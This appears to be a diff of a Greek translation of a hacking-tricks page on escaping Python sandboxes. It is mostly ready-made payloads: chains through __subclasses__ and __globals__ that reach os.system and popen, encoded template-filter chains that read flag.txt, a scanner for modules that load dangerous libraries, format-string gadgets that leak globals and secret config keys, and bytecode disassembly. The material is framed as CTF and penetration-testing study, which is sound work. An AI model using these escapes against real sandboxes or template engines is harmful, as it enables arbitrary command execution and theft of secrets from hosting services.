 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](./#recursive-search-of-builtins-globals) για να βρείτε δεκάδες/**εκατοντάδες** από **μέρη** όπου μπορείτε να βρείτε τα **globals**.
-
 ## Ανακάλυψη Αυθαίρετης Εκτέλεσης
 
-Εδώ θέλω να εξηγήσω πώς να ανακαλύψετε εύκολα **πιο επικίνδυνες λειτουργίες που φορτώνονται** και να προτείνετε πιο αξιόπιστες εκμεταλλεύσεις.
+Εδώ θέλω να εξηγήσω πώς μπορείτε εύκολα να ανακαλύψετε **περισσότερες επικίνδυνες λειτουργίες που φορτώνονται** και να προτείνετε πιο αξιόπιστες εκμεταλλεύσεις.
 
-#### Πρόσβαση σε υποκλάσεις με παράκαμψη
+#### Πρόσβαση σε υποκλάσεις με παρακάμψεις
 
-Ένα από τα πιο ευαίσθητα μέρη αυτής της τεχνικής είναι η δυνατότητα να **έχετε πρόσβαση στις βασικές υποκλάσεις**. Στα προηγούμενα παραδείγματα αυτό επιτεύχθηκε χρησιμοποιώντας `''.__class__.__base__.__subclasses__()` αλλά υπάρχουν **άλλοι πιθανοί τρόποι**:
+Ένα από τα πιο ευαίσθητα μέρη αυτής της τεχνικής είναι η δυνατότητα να **έχετε πρόσβαση στις βασικές υποκλάσεις**. Στα προηγούμενα παραδείγματα αυτό επιτεύχθηκε χρησιμοποιώντας `''.__class__.__base__.__subclasses__()`, αλλά υπάρχουν **άλλοι πιθανοί τρόποι**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -594,18 +433,18 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### Εύρεση επικίνδυνων βιβλιοθηκών που φορτώνονται
+### Εντοπισμός επικίνδυνων βιβλιοθηκών που φορτώνονται
 
-Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **φορτωμένα αρθρώματα που έχουν εισάγει το sys μέσα σε αυτά**:
+Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **φορτωμένα modules που έχουν εισάγει το sys μέσα σε αυτά**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Υπάρχουν πολλές, και **απλά χρειαζόμαστε μία** για να εκτελέσουμε εντολές:
+Υπάρχουν πολλοί, και **χρειαζόμαστε μόνο έναν** για να εκτελέσουμε εντολές:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Μπορούμε να κάνουμε το ίδιο πράγμα με **άλλες βιβλιοθήκες** που γνωρίζουμε ότι μπορούν να χρησιμοποιηθούν για να **εκτελέσουν εντολές**:
+Μπορούμε να κάνουμε το ίδιο πράγμα με **άλλες βιβλιοθήκες** που γνωρίζουμε ότι μπορούν να χρησιμοποιηθούν για **εκτέλεση εντολών**:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -640,7 +479,7 @@ defined_func.__class__.__base__.__subclasses__()
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Επιπλέον, μπορούμε ακόμη να αναζητήσουμε ποια αρθρώματα φορτώνουν κακόβουλες βιβλιοθήκες:
+Επιπλέον, μπορούμε ακόμα να αναζητήσουμε ποια modules φορτώνουν κακόβουλες βιβλιοθήκες:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -690,12 +529,11 @@ load_source: NullImporter, _HackedGetData
 execfile:
 execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
-"""
 ```
 ## Αναδρομική Αναζήτηση των Builtins, Globals...
 
 {% hint style="warning" %}
-Αυτό είναι απλά **φοβερό**. Αν **ψάχνετε για ένα αντικείμενο όπως τα globals, builtins, open ή οτιδήποτε άλλο**, απλά χρησιμοποιήστε αυτό το σενάριο για να **αναζητήσετε αναδρομικά τα μέρη όπου μπορείτε να βρείτε αυτό το αντικείμενο**.
+Αυτό είναι απλά **φοβερό**. Αν **ψάχνετε για ένα αντικείμενο όπως τα globals, builtins, open ή οτιδήποτε άλλο**, απλά χρησιμοποιήστε αυτό το σενάριο για να **αναζητήσετε αναδρομικά τα μέρη όπου μπορείτε να βρείτε αυτό το αντικείμενο.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -814,26 +652,17 @@ main()
 ```
 Μπορείτε να ελέγξετε την έξοδο αυτού του σεναρίου σε αυτήν τη σελίδα:
 
-{% content-ref url="broken-reference" %}
-[Σπασμένος σύνδεσμος](broken-reference)
+{% content-ref url="broken-reference/" %}
+[broken-reference](broken-reference/)
 {% endcontent-ref %}
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+## Συμβολοσειρά Μορφοποίησης Python
 
-Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τα APIs έως τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## Μορφοποίηση Συμβολοσειράς σε Python
-
-Εάν **στείλετε** μια **συμβολοσειρά** στην Python που θα **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε `{}` για να έχετε πρόσβαση σε **εσωτερικές πληροφορίες της Python**. Μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να έχετε πρόσβαση σε γενικές μεταβλητές ή ενσωματωμένες γραμμές κώδικα, για παράδειγμα.
+Εάν **στείλετε** μια **συμβολοσειρά** στο python που πρόκειται να **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε `{}` για να έχετε πρόσβαση σε **εσωτερικές πληροφορίες του python**. Μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να έχετε πρόσβαση σε globals ή builtins για παράδειγμα.
 
 {% hint style="info" %}
-Ωστόσο, υπάρχει μια **περιορισμένη δυνατότητα**, μπορείτε να χρησιμοποιήσετε μόνο τα σύμβολα `.[]`, οπότε **δεν θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα**, αλλά μόνο να διαβάσετε πληροφορίες.\
-_**Εάν γνωρίζετε πώς να εκτελέσετε κώδικα μέσω αυτής της ευπάθειας, παρακαλώ επικοινωνήστε μαζί μου.**_
-{% endhint %}
+Ωστόσο, υπάρχει μια **περιορισμός**, μπορείτε να χρησιμοποιήσετε μόνο τα σύμβολα `.[]`, οπότε **δεν θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα**, απλά να διαβάσετε πληροφορίες.\
+_**Αν γνωρίζετε πώς να εκτελέσετε κ
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -853,11 +682,11 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Σημειώστε πώς μπορείτε να **αποκτήσετε πρόσβαση σε χαρακτηριστικά** με τον κανονικό τρόπο με ένα **τελεία** όπως `people_obj.__init__` και στοιχεία **λεξικού** με **παρενθέσεις** χωρίς εισαγωγικά `__globals__[CONFIG]`
+Σημειώστε πώς μπορείτε **να έχετε πρόσβαση σε γνωρίσματα** με τον κανονικό τρόπο με ένα **τελεία** όπως `people_obj.__init__` και στα **στοιχεία λεξικού** με **παρενθέσεις** χωρίς εισαγωγικά `__globals__[CONFIG]`
 
-Επίσης, σημειώστε ότι μπορείτε να χρησιμοποιήσετε `.__dict__` για να απαριθμήσετε στοιχεία ενός αντικειμένου `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Επίσης, μπορείτε να χρησιμοποιήσετε το `.__dict__` για να απαριθμήσετε τα στοιχεία ενός αντικειμένου `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Ορισμένα άλλα ενδιαφέροντα χαρακτηριστικά από τις συμβολοσειρές μορφοποίησης είναι η δυνατότητα **εκτέλεσης** των **συναρτήσεων** **`str`**, **`repr`** και **`ascii`** στο συγκεκριμένο αντικείμενο προσθέτοντας **`!s`**, **`!r`**, **`!a`** αντίστοιχα:
+Κάποια άλλα ενδιαφέροντα χαρακτηριστικά από τις συμβολοσειρές μορφοποίησης είναι η δυνατότητα **εκτέλεσης** των **συναρτήσεων** **`str`**, **`repr`** και **`ascii`** στο συγκεκριμένο αντικείμενο προσθέτοντας **`!s`**, **`!r`**, **`!a`** αντίστοιχα:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -873,7 +702,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Περισσότερα παραδείγματα** για παραδείγματα **μορφοποίησης** **συμβολοσειράς** μπορείτε να βρείτε στην ιστοσελίδα [**https://pyformat.info/**](https://pyformat.info)
+**Περισσότερα παραδείγματα** σχετικά με παραδείγματα **μορφοποίησης** μπορούν να βρεθούν στο [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
 Ελέγξτε επίσης την παρακάτω σελίδα για gadgets που θα **διαβάσουν ευαίσθητες πληροφορίες από εσωτερικά αντικείμενα της Python**:
@@ -883,7 +712,7 @@ return 'HAL 9000'
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Πληροφορίες Αποκάλυψης Ευαίσθητων Πληροφοριών
+### Πληροφορίες Αποκάλυψης Ευαίσθητων Δεδομένων
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -894,13 +723,13 @@ return 'HAL 9000'
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-## Ανάλυση Αντικειμένων Python
+## Ανάλυση Αντικειμένων σε Python
 
 {% hint style="info" %}
-Εάν θέλετε να **μάθετε** για το **bytecode της Python** λεπτομερώς, διαβάστε αυτήν την **εκπληκτική** ανάρτηση για το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Αν θέλετε να **μάθετε** για το **bytecode της Python** λεπτομερώς, διαβάστε αυτήν την **εκπληκτική** ανάρτηση σχετικά με το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Σε ορισμένα CTFs μπορεί να σας δίνεται το όνομα μιας **προσαρμοσμένης συνάρτησης** όπου βρίσκεται η σημαία και χρειάζεστε να δείτε τα **εσωτερικά** της συνάρτησης για να την εξαγάγετε.
+Σε ορισμένα CTFs μπορεί να σας δίνεται το όνομα μιας **προσαρμοσμένης συνάρτησης** όπου βρίσκεται η σημαία και χρειάζεται να δείτε τα **εσωτερικά** της **συνάρτησης** για να την εξάγετε.
 
 Αυτή είναι η συνάρτηση προς επιθεώρηση:
 ```python
@@ -914,31 +743,6 @@ else:
 return "Nope"
 ```
 #### dir
-
-Η συνάρτηση `dir` χρησιμοποιείται για να επιστρέψει μια λίστα με τα ονόματα των στοιχείων σε ένα αντικείμενο. Αυτά τα στοιχεία μπορεί να είναι μεταβλητές, συναρτήσεις, κλάσεις, μέθοδοι κ.λπ. Η συνάρτηση `dir` είναι χρήσιμη για την εξερεύνηση των διαθέσιμων στοιχείων ενός αντικειμένου και την ανάλυση της δομής του.
-
-Σύνταξη:
-```python
-dir(object)
-```
-
-Παράδειγμα:
-```python
-class MyClass:
-    def __init__(self):
-        self.name = "John"
-        self.age = 30
-
-my_object = MyClass()
-print(dir(my_object))
-```
-
-Αποτέλεσμα:
-```
-['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name']
-```
-
-Στο παραπάνω παράδειγμα, η συνάρτηση `dir` επιστρέφει μια λίστα με τα ονόματα των στοιχείων του αντικειμένου `my_object`, που περιλαμβάνει τις μεταβλητές `name` και `age`.
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -947,7 +751,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` και `func_globals`(Ίδιο) Αποκτά το παγκόσμιο περιβάλλον. Στο παράδειγμα μπορείτε να δείτε μερικά εισαγόμενα αρθρώματα, μερικές παγκόσμιες μεταβλητές και το περιεχόμενό τους που έχουν δηλωθεί:
+`__globals__` και `func_globals`(Ίδιο) Αποκτά το παγκόσμιο περιβάλλον. Στο παράδειγμα μπορείτε να δείτε μερικά εισαγμένα modules, μερικές παγκόσμιες μεταβλητές και το περιεχόμενό τους που δηλώνονται:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -956,7 +760,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Δείτε εδώ περισσότερα μέρη για να αποκτήσετε τις globals**](./#globals-and-locals)
+[**Δείτε εδώ περισσότερα μέρη για να αποκτήσετε τα globals**](./#globals-and-locals)
 
 ### **Πρόσβαση στον κώδικα της συνάρτησης**
 
@@ -975,30 +779,6 @@ dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
 ### Λήψη Πληροφοριών Κώδικα
-
-To bypass Python sandboxes, it is important to gather information about the code being executed. This information can help in identifying vulnerabilities and finding ways to exploit them.
-
-#### 1. Inspecting the code
-
-One way to gather code information is by inspecting the source code itself. This can be done by using tools like `inspect` or by reading the code directly. By analyzing the code, you can identify potential security flaws or weak points that can be exploited.
-
-#### 2. Analyzing dependencies
-
-Another important aspect is to analyze the dependencies of the code. This includes libraries, modules, and external packages that the code relies on. By understanding the dependencies, you can identify potential vulnerabilities in these components and exploit them to bypass the sandbox.
-
-#### 3. Identifying entry points
-
-Identifying the entry points of the code is crucial for bypassing the sandbox. Entry points are the parts of the code that are executed first when the program starts. By analyzing the entry points, you can understand the flow of the code and find ways to manipulate it to bypass the sandbox.
-
-#### 4. Examining error messages
-
-Error messages can provide valuable information about the code execution. By examining error messages, you can identify potential vulnerabilities or misconfigurations that can be exploited to bypass the sandbox. Pay attention to any sensitive information or stack traces that might be leaked in the error messages.
-
-#### 5. Monitoring system calls
-
-Monitoring system calls can help in understanding the behavior of the code and identifying any suspicious or malicious activities. Tools like `strace` or `sysdig` can be used to monitor system calls and gather information about the code execution. By analyzing the system calls, you can identify potential vulnerabilities or ways to bypass the sandbox.
-
-By gathering code information through these techniques, you can gain a better understanding of the code being executed and find ways to bypass Python sandboxes.
 ```python
 # Another example
 s = '''
@@ -1045,26 +825,6 @@ get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
 ### **Αποσυναρμολόγηση μιας συνάρτησης**
-
-To disassemble a function in Python, you can use the `dis` module. This module provides functions to disassemble and inspect Python bytecode. By disassembling a function, you can see the low-level instructions that make up the function's code.
-
-Here's an example of how to disassemble a function using the `dis` module:
-
-```python
-import dis
-
-def my_function():
-    x = 5
-    y = 10
-    z = x + y
-    print(z)
-
-dis.dis(my_function)
-```
-
-This will output the disassembled bytecode of the `my_function` function, showing the individual instructions and their corresponding bytecode offsets.
-
-By analyzing the disassembled code, you can gain insights into how the function works and potentially identify any vulnerabilities or weaknesses in the code. Disassembling functions can be particularly useful when bypassing Python sandboxes or analyzing obfuscated code.
 ```python
 import dis
 dis.dis(get_flag)
@@ -1092,7 +852,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Παρατηρήστε ότι **αν δεν μπορείτε να εισαγάγετε το `dis` στο περιβάλλον εκτέλεσης της Python**, μπορείτε να αποκτήσετε το **bytecode** της συνάρτησης (`get_flag.func_code.co_code`) και να το αποσυναρμολογήσετε τοπικά. Δεν θα δείτε το περιεχόμενο των μεταβλητών που φορτώνονται (`LOAD_CONST`), αλλά μπορείτε να τις μαντέψετε από το (`get_flag.func_code.co_consts`) επειδή το `LOAD_CONST` δίνει επίσης τη θέση της μεταβλητής που φορτώνεται.
+Σημείωση ότι **αν δεν μπορείτε να εισάγετε το `dis` στο περιβάλλον Python** μπορείτε να αποκτήσετε το **bytecode** της συνάρτησης (`get_flag.func_code.co_code`) και να το **αποσυναρμολογήσετε** τοπικά. Δεν θα δείτε το περιεχόμενο των μεταβλητών που φορτώνονται (`LOAD_CONST`) αλλά μπορείτε να τις μαντέψετε από το (`get_flag.func_code.co_consts`) επειδή το `LOAD_CONST` δείχνει επίσης τη θέση της μεταβλητής που φορτώνεται.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -1114,10 +874,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Μεταγλώττιση της Python
+## Συναρμολόγηση της Python
 
-Ας υποθέσουμε τώρα ότι καταφέρνετε κάπως να **ανακτήσετε πληροφορίες για μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να την **εκτελέσετε**.\
-Όπως στο παρακάτω παράδειγμα, μπορείτε **να έχετε πρόσβαση στο αντικείμενο κώδικα** αυτής της συνάρτησης, αλλά απλά διαβάζοντας την αποσυναρμολόγηση δεν ξέρετε πώς να υπολογίσετε τη σημαία (_φανταστείτε μια πιο πολύπλοκη συνάρτηση `calc_flag`_).
+Τώρα, ας φανταστούμε ότι μπορείτε κάπως να **ανακτήσετε τις πληροφορίες για μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να την **εκτελέσετε**.\
+Όπως στο παρακάτω παράδειγμα, **μπορείτε να έχετε πρόσβαση στο αντικείμενο κώδικα** αυτής της συνάρτησης, αλλά απλά διαβάζοντας την αποσυναρμολόγηση δεν **ξέρετε πώς να υπολογίσετε τη σημαία** (_φανταστείτε μια πιο πολύπλοκη συνάρτηση `calc_flag`_).
 ```python
 def get_flag(some_input):
 var1=1
@@ -1132,7 +892,7 @@ return "Nope"
 ```
 ### Δημιουργία του αντικειμένου κώδικα
 
